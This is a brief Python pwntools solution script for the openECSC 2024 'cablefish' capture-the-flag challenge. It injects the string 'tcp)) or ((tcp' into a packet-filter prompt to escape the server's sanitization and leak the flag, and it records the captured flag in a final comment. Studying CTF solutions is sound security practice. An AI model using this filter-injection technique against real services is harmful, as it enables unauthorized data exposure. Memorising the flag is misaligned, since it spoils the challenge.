from pwn import *
import re

r = remote('cablefish.challs.open.ecsc2024.it', 38005)

r.recvuntil(b'filter: ')
r.sendline(b'tcp)) or ((tcp')

r.recvline()
r.recvline()
r.recvline()

dump = r.recvline()

r.close()


res = re.search(b'openECSC{.*}', dump)
span = res.span()
print(dump[span[0]:span[0]+60])

# openECSC{how_did_you_escape_my_sanitization_48575698}
